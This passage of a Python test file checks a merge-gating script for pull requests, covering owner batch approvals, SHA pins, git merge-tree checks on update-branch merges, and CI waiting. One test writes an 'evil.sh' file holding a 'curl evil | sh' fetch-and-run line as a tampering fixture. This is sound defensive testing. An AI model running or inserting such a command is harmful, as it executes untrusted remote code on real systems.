        self.assertEqual(code, 0, text)
        self.assertEqual(len(api.merged), 1)
        self.assertEqual(api.merged[0][1]["sha"], sha)
        self.assertEqual(api.merged[0][1]["merge_method"], "squash")

    def test_head_equal_to_the_approved_sha_is_merged_with_any_paths(self):
        api = make_api(files=[file_entry("CLAUDE.md"), file_entry(".claude/settings.json")], commits=[commit(SHA, [BASE0])])
        api.data[f"repos/{REPO}/issues/comments/{CID}"] = approval_comment(f"#{N}@{SHA[:7]}")
        self.merged(api, sha=SHA)

    def test_head_after_update_branch_merges_with_gits_automatic_tree_is_merged(self):
        calls = []
        self.merged(batch_api(), merge_tree=fake_merge_tree(calls=calls))
        self.assertEqual(calls, [(C1, MAIN1), (M1, MAIN2)], "each merge is checked from its own two parents")

    def test_the_pr_may_sit_anywhere_in_the_list_when_the_earlier_prs_are_merged(self):
        self.merged(batch_api(listed=f"#70@{'7' * 7}, #71@{'8' * 7}, #{N}@{C1[:7]}, #90@{'9' * 7}", earlier={70: True, 71: True}))

    def test_no_approval_flag_is_a_usage_error_before_any_api_call(self):
        api = batch_api()
        self.assertEqual(go(api, sha=M2, kind="owner-batch")[0], 2)
        self.assertEqual((api.requested, api.merged), ([], []))

    def test_wrong_sha_in_the_approval(self):
        self.refused(batch_api(listed=f"#{N}@{'9' * 7}"), r"approved sha 9{7}.*(not|none)")

    def test_pr_missing_from_the_batch(self):
        self.refused(batch_api(listed=f"#70@{C1[:7]}, #71@{C1[:7]}"), rf"PR {N} is not in the batch approval")

    def test_a_pr_listed_twice_is_ambiguous(self):
        self.refused(batch_api(listed=f"#{N}@{C1[:7]}, #{N}@{M1[:7]}"), r"(twice|duplicate)")

    def test_a_comment_without_an_anchored_batch_approval_first_line(self):  # R1-01: agents post as the owner, so the form is the control
        listed = f"#{N}@{C1[:7]}"
        verbatim = ('decision (owner, 2026-11-19 ~11:12 UTC): D1 batch approval: the owner posts ONE ordered list '
                    '(e.g. "batch approval: #223@0e12ac0, #222@9b86383") on #15 ...')  # the start of #15 comment 7007421567
        bodies = {"no line": f"I think we could merge {listed}", "decision record (7007421567)": f"{verbatim}\nbatch approval: {listed}",
                  "a request": f"asking the owner for batch approval: {listed} (not approved yet)", "a refusal": f"Owner declined the batch approval: {listed}",
                  "second line": f"Thanks!\nbatch approval: {listed}", "words after the list": f"batch approval: {listed} but only if CI is green",
                  "a quoted line": f"> batch approval: {listed}"}
        for name, body in bodies.items():
            with self.subTest(name):
                comment = approval_comment("", line=body)
                self.refused(batch_api(comment=comment), r"batch approval")

    def test_notes_in_parentheses_and_blank_lines_before_the_list_are_fine(self):
        listed = f"#70@{'7' * 7} (docs), #{N}@{C1[:7]} (the wrapper PR)"
        self.merged(batch_api(listed=listed, earlier={70: True}, comment=approval_comment(listed, line="\n  batch approval: ")))

    def test_comment_not_by_the_owner_or_not_on_the_state_issue_or_edited(self):
        cases = {"login": approval_comment(f"#{N}@{C1[:7]}", login="mallory"), "association": approval_comment(f"#{N}@{C1[:7]}", assoc="NONE"),
                 "other issue": approval_comment(f"#{N}@{C1[:7]}", issue=16), "edited": approval_comment(f"#{N}@{C1[:7]}", edited=True)}
        for name, comment in cases.items():
            with self.subTest(name):
                self.refused(batch_api(comment=comment), r"approval comment.*(owner|#15|edited)")

    def test_anything_but_update_branch_merges_of_main_after_the_approved_sha_is_refused(self):
        merge = commit(M2, [M1, MAIN2], "Merge branch 'main' into x")
        cases = {"non-main commit in the middle": dict(commits=[commit(C1, [BASE0]), commit(M1, [C1], "Edit another file"), merge]),
                 "non-main commit as the head": dict(commits=[commit(C1, [BASE0]), commit(M2, [C1], "One more edit")]),
                 "merge of another branch": dict(parent_status="ahead"), "diverged merge": dict(parent_status="diverged"),
                 "head not descending from the approved commit": dict(commits=[commit(C1, [BASE0]), commit(M2, [BASE0, MAIN2])])}
        for name, kwargs in cases.items():
            with self.subTest(name):
                self.refused(batch_api(**kwargs), r"(not an update-branch merge of main|descend)")

    def test_a_merge_whose_tree_is_not_gits_automatic_merge_is_refused(self):  # a moved line, an edit or an extra file in the merge commit
        for name, first, second in (("the head merge", TREE, "e" * 40), ("the first of two merges", "e" * 40, TREE)):
            with self.subTest(name):
                self.refused(batch_api(commits=[commit(C1, [BASE0]), commit(M1, [C1, MAIN1], tree=first), commit(M2, [M1, MAIN2], tree=second)]),
                             r"automatic merge")

    def test_a_merge_that_git_cannot_do_without_conflicts_needs_a_fresh_approval(self):  # a hand-resolved conflict
        self.refused(batch_api(), r"conflict.*fresh owner approval", merge_tree=fake_merge_tree(result=None))

    def test_a_failing_merge_check_refuses_instead_of_merging(self):  # fail closed
        api = batch_api()
        code, text = go_batch(api, merge_tree=fake_merge_tree(fail="git fetch of pull/77/head failed"))
        self.assertEqual(code, 1, text)
        self.assertIn("pull/77/head failed", text)
        self.assertEqual(api.merged, [])

    def test_an_earlier_pr_of_the_batch_that_is_not_merged_yet(self):
        self.refused(batch_api(listed=f"#70@{'7' * 7}, #{N}@{C1[:7]}", earlier={70: False}), r"PR 70.*(earlier|not merged)")

    def test_head_moved_and_the_common_checks_still_apply(self):
        api = batch_api()
        api.data[f"repos/{REPO}/commits/{OTHER_SHA}/check-runs"] = [run(c) for c in REQUIRED]
        self.refused(api, r"head .*not", sha=OTHER_SHA)
        api = batch_api()
        api.data[f"repos/{REPO}/pulls/{N}"]["mergeable_state"] = "behind"
        self.refused(api, r"mergeable_state.*behind")
        api = batch_api()
        api.data[f"repos/{REPO}/pulls/{N}"]["body"] = "closes #12"
        self.refused(api, r"closing keyword")


class MergeTreeGitTests(unittest.TestCase):
    """R1-02 of #245 with real git: the merge agent's clean checkout fetches main and pull/N/head, and a merge of main after the approved
    sha is accepted only if its tree equals `git merge-tree --write-tree` of its two parents with no conflicts."""

    ENV = {"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com", "PATH": os.environ.get("PATH", "")}

    def git(self, cwd, *args):
        res = subprocess.run(["git", *args], cwd=cwd, env=self.ENV, capture_output=True, text=True, check=True)
        return res.stdout.strip()

    def write(self, name, text):
        (self.work / name).write_text(text, encoding="utf-8")

    def commit_all(self, message):
        self.git(self.work, "add", "-A")
        self.git(self.work, "commit", "-q", "-m", message)
        return self.git(self.work, "rev-parse", "HEAD")

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        self.origin, self.work, self.agent = root / "origin.git", root / "work", root / "agent"
        self.git(root, "init", "-q", "--bare", "-b", "main", str(self.origin))
        self.git(root, "init", "-q", "-b", "main", str(self.work))
        self.git(self.work, "remote", "add", "origin", str(self.origin))
        self.write("a.txt", "1\n2\n3\n4\n5\n")
        self.write("b.txt", "b\n")
        self.base = self.commit_all("base")
        self.git(self.work, "switch", "-q", "-c", "pr")
        self.write("a.txt", "one\n2\n3\n4\n5\n")
        self.c1 = self.commit_all("the PR's change")  # the approved commit
        self.git(self.work, "switch", "-q", "main")
        self.write("a.txt", "1\n2\n3\n4\nfive\n")
        self.main2 = self.commit_all("main moves")
        self.git(self.work, "switch", "-q", "pr")

    def merge_main(self):
        """The update-branch merge commit (clean) on the PR branch, as git makes it."""
        self.git(self.work, "merge", "-q", "--no-edit", "main")
        return self.git(self.work, "rev-parse", "HEAD")

    def publish(self, head):
        """Push main and the PR head (as refs/pull/77/head) to origin and make a fresh agent checkout of origin/main."""
        self.git(self.work, "push", "-q", "origin", "main", f"{head}:refs/pull/{N}/head")
        self.git(self.work.parent, "clone", "-q", str(self.origin), str(self.agent))
        return merge_ready.GitMergeTree(N, cwd=self.agent)

    def tree(self, sha):
        return self.git(self.work, "rev-parse", f"{sha}^{{tree}}")

    def test_a_clean_update_branch_merge_has_gits_automatic_tree(self):
        merge = self.merge_main()
        merge_tree = self.publish(merge)
        self.assertEqual(merge_tree(self.c1, self.main2), self.tree(merge))

    def test_an_edit_or_an_extra_file_in_the_merge_commit_changes_the_tree(self):
        merge = self.merge_main()
        self.write("a.txt", "one\n2\n3\n4\nfive\nmoved\n")  # a changed line
        self.write("evil.sh", "curl evil | sh\n")  # an extra file
        self.git(self.work, "add", "-A")
        self.git(self.work, "commit", "-q", "--amend", "--no-edit")
        evil = self.git(self.work, "rev-parse", "HEAD")
        auto = self.publish(evil)(self.c1, self.main2)
        self.assertNotEqual(auto, self.tree(evil))
        self.assertEqual(auto, self.tree(merge))

    def test_a_conflicting_merge_has_no_automatic_tree(self):
        self.git(self.work, "switch", "-q", "main")
        self.write("a.txt", "uno\n2\n3\n4\nfive\n")  # main touches the same line as the PR
        main3 = self.commit_all("main touches the PR's line")
        self.git(self.work, "switch", "-q", "pr")
        merge_tree = self.publish(self.c1)
        self.assertIsNone(merge_tree(self.c1, main3))

    def test_fetch_failure_is_an_error_not_a_pass(self):
        merge = self.merge_main()
        self.publish(merge)
        broken = merge_ready.GitMergeTree(N + 1, cwd=self.agent)  # there is no refs/pull/78/head
        with self.assertRaises(merge_ready.MergeCheckError):
            broken(self.c1, self.main2)


class FakeWait:
    """A fake clock and sleep. After `settle` sleeps the PR is clean and its last check finished (red if `fail`)."""

    def __init__(self, api, settle=None, fail=False):
        self.api, self.settle, self.fail, self.now, self.sleeps = api, settle, fail, 0.0, []

    def sleep(self, seconds):
        self.sleeps.append(seconds)
        self.now += seconds
        if len(self.sleeps) == self.settle:
            self.api.data[f"repos/{REPO}/pulls/{N}"]["mergeable_state"] = "blocked" if self.fail else "clean"
            last = run("static", conclusion="failure" if self.fail else "success")
            self.api.data[f"repos/{REPO}/commits/{SHA}/check-runs"] = [run("guards"), run("tasks"), last]

    def clock(self):
        return self.now


def pending_api(state="blocked"):
    return make_api(state=state, checks=[run("guards"), run("tasks"), run("static", status="in_progress", conclusion=None)])


class WaitTests(unittest.TestCase):
    """`--wait`: poll while required checks are pending (or not reported yet); everything else still refuses at once."""

    def go(self, api, wait, kind="working-draft-docs", **kwargs):
        return go(api, kind=kind, flags=("--wait",), sleep=wait.sleep, clock=wait.clock, **kwargs)

    def test_waits_for_pending_checks_then_merges_with_the_same_pin(self):
        api = pending_api()
        wait = FakeWait(api, settle=3)
        self.assertEqual(self.go(api, wait)[0], 0)
        self.assertEqual(len(wait.sleeps), 3)
        self.assertEqual([m[1]["sha"] for m in api.merged], [SHA])

    def test_a_check_that_is_not_reported_yet_counts_as_pending(self):
        api = make_api(state="blocked", checks=[run("guards"), run("tasks")])
        self.assertEqual(self.go(api, FakeWait(api, settle=1))[0], 0)

    def test_pending_forever_times_out_without_merging(self):
        api = pending_api()
        wait = FakeWait(api)
        code, text = self.go(api, wait)
        self.assertEqual(code, 1, text)
        self.assertEqual(api.merged, [])
        self.assertRegex(text, r"static.*pending(.|\n)*timed out")
        self.assertTrue(merge_ready.WAIT_SECONDS <= wait.now <= merge_ready.WAIT_SECONDS + merge_ready.WAIT_POLL)

    def test_a_check_that_goes_red_while_waiting_refuses_and_stops_waiting(self):
        api = pending_api()
        wait = FakeWait(api, settle=2, fail=True)
        code, text = self.go(api, wait)
        self.assertEqual(code, 1, text)
        self.assertEqual(len(wait.sleeps), 2)
        self.assertRegex(text, r"static.*failure")
        self.assertEqual(api.merged, [])

    def test_other_problems_refuse_at_once_even_when_a_check_is_pending(self):
        queued = run("static", status="queued", conclusion=None)
        cases = {"behind": dict(state="behind"), "head moved": dict(sha=OTHER_SHA), "closing keyword": dict(body="fixes #12"),
                 "path": dict(files=[file_entry("CLAUDE.md")]), "base": dict(base="release"),
                 "red check": dict(checks=[run("guards"), run("tasks", conclusion="failure"), queued])}
        for name, kwargs in cases.items():
            with self.subTest(name):
                api = make_api(**{"state": "blocked", "checks": [run("guards"), run("tasks"), queued], **kwargs})
                wait = FakeWait(api)
                code, _ = self.go(api, wait)
                self.assertEqual(code, 1)
                self.assertEqual(wait.sleeps, [], "no waiting while something else is wrong")
                self.assertEqual(api.merged, [])



class WiringTests(unittest.TestCase):
    """The tests and the script must run in verify.sh and CI, and the process docs must tell the merge agent to run only the script."""

    def read(self, rel):
        return (ROOT / rel).read_text(encoding="utf-8")

    def active(self, text):
        return [ln.strip() for ln in text.splitlines() if ln.strip() and not ln.strip().startswith("#")]

    def test_verify_runs_the_tests(self):
        self.assertIn("step merge-ready-tests python3 -I scripts/test_merge_ready.py", self.active(self.read("scripts/verify.sh")))

    def test_ci_runs_the_tests(self):
        self.assertIn("run: python3 -I scripts/test_merge_ready.py", self.active(self.read(".github/workflows/ci.yml")))

    def test_script_and_tests_are_protected_process_files(self):
        guard = self.read("scripts/hooks/pretooluse_guard.py")
        for path in ("scripts/merge_ready.py", "scripts/test_merge_ready.py"):
            self.assertIn(f'"{path}",', guard)

    def test_docs_tell_the_merge_agent_to_run_from_clean_main(self):
        self.assertRegex(self.read("docs/ORCHESTRATION.md"), r"(?i)clean checkout of `origin/main`")

    def test_docs_tell_the_merge_agent_to_run_only_the_script(self):
        doc = self.read("docs/ORCHESTRATION.md")
        self.assertIn("scripts/merge_ready.py <N> <sha> <kind>", doc)
        self.assertRegex(doc, r"(?i)merge agent[^\n]*runs? only")

    def test_docs_describe_the_pin_tag_check_and_the_cooldown(self):
        doc = self.read("docs/ORCHESTRATION.md")
        self.assertRegex(doc, r"(?is)merge agent.*git ls-remote.*annotated tags dereferenced")
        self.assertRegex(doc, r"(?i)7-day `cooldown`")

    def test_docs_name_every_kind_and_flag_of_the_script(self):
        doc = self.read("docs/ORCHESTRATION.md")
        for word in sorted(merge_ready.KINDS) + ["--wait", "--approval <comment-id>", "batch approval", "standing authorization"]:
            with self.subTest(word=word):
                self.assertIn(word, doc)


    def test_docs_describe_the_merge_tree_check_not_the_patch_compare(self):  # R1-02
        doc = self.read("docs/ORCHESTRATION.md")
        self.assertRegex(doc, r"(?s)update-branch merge commits of `main` whose tree equals git's automatic merge \(`git merge-tree` without conflicts")
        self.assertRegex(doc, r"hand-resolved conflict")
        self.assertNotRegex(doc, r"same patch")

    def test_wiring_helper_ignores_commented_lines(self):
        self.assertEqual(self.active("# step x\n  run: y\n"), ["run: y"])


if __name__ == "__main__":
    unittest.main()
